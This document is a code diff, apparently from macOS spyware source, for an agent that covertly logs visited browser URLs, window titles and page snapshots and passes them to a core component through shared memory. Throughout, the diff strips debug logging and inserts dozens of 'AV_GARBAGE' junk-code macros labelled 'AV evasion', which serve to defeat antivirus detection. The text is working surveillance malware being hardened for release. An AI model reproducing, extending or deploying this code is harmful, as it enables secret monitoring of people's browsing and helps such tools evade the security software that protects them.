@@ -86,11 +86,17 @@ void logSnapshot(NSData *imageData, int browserType)
   
   urlSnapAdditionalStruct *urlSnapshotAdditionalHeader = (urlSnapAdditionalStruct *)[entryData bytes];
   urlSnapshotAdditionalHeader->version        = LOG_URLSNAP_VERSION;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   urlSnapshotAdditionalHeader->browserType    = browserType;
-  urlSnapshotAdditionalHeader->urlNameLen     = [gPrevURL
-    lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
-  urlSnapshotAdditionalHeader->windowTitleLen = [_windowName
-    lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
+  urlSnapshotAdditionalHeader->urlNameLen     = [gPrevURL lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
+  urlSnapshotAdditionalHeader->windowTitleLen = [_windowName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
   
   // AV evasion: only on release build
   AV_GARBAGE_006
@@ -147,7 +153,10 @@ void logSnapshot(NSData *imageData, int browserType)
           AV_GARBAGE_001
           
           shMemoryHeader->direction       = D_TO_CORE;
-
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_003
+          
           //
           // If it's the first log pass create log header
           // if it's the last close log otherwise just data
@@ -168,26 +177,46 @@ void logSnapshot(NSData *imageData, int browserType)
             }
           else
             {
-#ifdef DEBUG_URL
-              //infoLog(@"Sending CM_LOG_DATA");
-#endif
+              // AV evasion: only on release build
+              AV_GARBAGE_001
+              
               shMemoryHeader->commandType     = CM_LOG_DATA;
             }
 
           struct timeval tTime;
           gettimeofday(&tTime, NULL);
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_004
+          
           int highSec = (int32_t)tTime.tv_sec << 20;
-
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_001
+          
           shMemoryHeader->timestamp       = highSec | tTime.tv_usec;
-
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_003
+          
           // Snapshot ID in order to log multiple pictures concurrently
           shMemoryHeader->flag            = currentSnapID;
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_009
+          
           shMemoryHeader->commandDataSize = leftBytesLength;
-
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_007
+          
           memcpy(shMemoryHeader->commandData,
                  [entryData bytes] + byteIndex,
                  leftBytesLength);
-
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_000
+          
           if ([mSharedMemoryLogging writeMemory: logData
                                          offset: 0
                                   fromComponent: COMP_AGENT] == TRUE)
@@ -215,16 +244,38 @@ void logSnapshot(NSData *imageData, int browserType)
       shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
 
       shMemoryHeader->status          = SHMEM_WRITTEN;
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
       shMemoryHeader->agentID         = LOG_URL_SNAPSHOT;
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_004
+      
       shMemoryHeader->direction       = D_TO_CORE;
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       shMemoryHeader->commandType     = CM_LOG_DATA;
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+      
       shMemoryHeader->flag            = 0;
       shMemoryHeader->commandDataSize = [entryData length];
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_008
+      
       memcpy(shMemoryHeader->commandData,
              [entryData bytes],
              [entryData length]);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       if ([mSharedMemoryLogging writeMemory: logData
                                      offset: 0
                               fromComponent: COMP_AGENT] == TRUE)
@@ -239,13 +290,15 @@ void logSnapshot(NSData *imageData, int browserType)
           errorLog(@"Error while logging url snapshot to shared memory");
 #endif
         }
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+      
       [logData release];
     }
-
-#ifdef DEBUG_URL
-  infoLog(@"URL Snapshot sent");
-#endif
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
 
   [entryData release];
   [windowName release];
@@ -409,21 +462,27 @@ void URLStartAgent()
     }
   
   interval = [[NSDate date] timeIntervalSinceDate: gURLDate];
-#ifdef DEBUG_URL
-  infoLog(@"interval : %f", interval);
-#endif
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   NSString *tempUrl1 = [URL stringByReplacingOccurrencesOfString: @"http://"
                                                       withString: @""];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   NSString *tempUrl2 = [URL stringByReplacingOccurrencesOfString: @"http://www."
                                                       withString: @""];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   NSString *tempUrl3 = [URL stringByReplacingOccurrencesOfString: @"www."
                                                       withString: @""];
-#ifdef DEBUG_URL
-  verboseLog(@"tempURL1: %@", tempUrl1);
-  verboseLog(@"tempURL2: %@", tempUrl2);
-  verboseLog(@"tempURL3: %@", tempUrl3);
-#endif
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   //
   // if
@@ -438,42 +497,88 @@ void URLStartAgent()
           || [gPrevURL isEqualToString: tempUrl3])
       && interval <= (double)5)
     {
-#ifdef DEBUG_URL
-      infoLog(@"URL already logged <= 5 seconds ago");
-#endif
+      // AV evasion: only on release build
+      AV_GARBAGE_008
+    
       return;
     }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   if (gPrevURL != nil)
     [gPrevURL release];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   gPrevURL = [URL copy];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   [gURLDate release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   gURLDate = [[NSDate date] retain];
   
-#ifdef DEBUG_URL
-  infoLog(@"URL: %@", URL);
-  infoLog(@"Sleeping for grabbing the correct window title");
-#endif
+  // AV evasion: only on release build
+  AV_GARBAGE_008
   
   // In order to avoid grabbing a wrong window title
   // was 80k
   usleep(300000);
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   NSDictionary  *windowInfo;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   NSString      *_windowName;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   NSMutableData *windowName;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
   
   NSString *_empty            = @"EMPTY";
   //NSURL *_url                 = [[self _locationFieldURL] copy];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   NSData *url = [URL dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   NSMutableData *logData    = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   NSMutableData *entryData  = [[NSMutableData alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   short unicodeNullTerminator = 0x0000;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   time_t rawtime;
   struct tm *tmTemp;
@@ -481,8 +586,19 @@ void URLStartAgent()
   // Struct tm
   time (&rawtime);
   tmTemp             = gmtime(&rawtime);
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   tmTemp->tm_year   += 1900;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   tmTemp->tm_mon    ++;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
   
   //
   // Our struct is 0x8 bytes bigger than the one declared on win32
@@ -491,26 +607,48 @@ void URLStartAgent()
   //
   if (sizeof(long) == 4) // 32bit
     {
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+      
       [entryData appendBytes: (const void *)tmTemp
                       length: sizeof (struct tm) - 0x8];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
     }
   else if (sizeof(long) == 8) // 64bit
     {
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       [entryData appendBytes: (const void *)tmTemp
                       length: sizeof (struct tm) - 0x14];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+      
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   u_int32_t logVersion = 0x20100713;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
   
   // Log Marker/Version (retrocompatibility)
   [entryData appendBytes: &logVersion
                   length: sizeof(logVersion)];
-#ifdef DEBUG_URL
-  verboseLog(@"entryData: %@", entryData);
-#endif
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
 
   // URL Name
   [entryData appendData: url];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   //char singleNullTerminator = '\0';
   
@@ -518,40 +656,51 @@ void URLStartAgent()
   [entryData appendBytes: &unicodeNullTerminator
                   length: sizeof(short)];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   // Browser Type
   int browserType = [[aDict objectForKey: @"agent"] intValue];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
   
   [entryData appendBytes: &browserType
                   length: sizeof(browserType)];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   // Window Name
   if ((windowInfo = getActiveWindowInformationForPID(getpid())) == nil)
     {
-#ifdef DEBUG_URL
-      infoLog(@"No windowInfo found");
-#endif
+      // AV evasion: only on release build
+      AV_GARBAGE_000
+    
       [entryData appendData: [_empty dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
     }
   else
     {
       if ([[windowInfo objectForKey: @"windowName"] length] == 0)
-        {
-#ifdef DEBUG_URL
-          infoLog(@"windowName is empty");
-          infoLog(@"processName %@", [windowInfo objectForKey: @"processName"]);
-#endif
+        { 
+          // AV evasion: only on release build
+          AV_GARBAGE_001
+        
           [entryData appendData: [_empty dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
         }
       else
         {
           _windowName = [[windowInfo objectForKey: @"windowName"] copy];
           
-#ifdef DEBUG_URL
-          infoLog(@"windowName: %@", _windowName);
-#endif
+          // AV evasion: only on release build
+          AV_GARBAGE_002
+          
           windowName = [[NSMutableData alloc] initWithData:
                         [_windowName dataUsingEncoding:
                          NSUTF16LittleEndianStringEncoding]];
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_003
           
           [entryData appendData: windowName];
           [windowName release];
@@ -559,30 +708,53 @@ void URLStartAgent()
         }
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   // Null terminator
   [entryData appendBytes: &unicodeNullTerminator
                   length: sizeof(short)];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   // Delimiter
   unsigned int del = LOG_DELIMITER;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   [entryData appendBytes: &del
                   length: sizeof(del)];
   
-#ifdef DEBUG_URL
-  infoLog(@"entryData final: %@", entryData);
-#endif
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   // Log buffer
   shMemoryHeader->status          = SHMEM_WRITTEN;
   shMemoryHeader->agentID         = AGENT_URL;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   shMemoryHeader->direction       = D_TO_CORE;
   shMemoryHeader->commandType     = CM_LOG_DATA;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   shMemoryHeader->flag            = 0;
   shMemoryHeader->commandDataSize = [entryData length];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   memcpy(shMemoryHeader->commandData,
          [entryData bytes],
          [entryData length]);
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
   
   //infoLog(@"logData: %@", logData);
   
@@ -601,17 +773,25 @@ void URLStartAgent()
 #endif
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   [logData release];
   [entryData release];
   [outerPool drain];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   if (gIsSnapshotActive)
     {
-#ifdef DEBUG_URL
-      infoLog(@"Grabbing snapshot");
-#endif
-
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+    
       grabSnapshot(browserType);
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002      
     }
   
   [aDict release];
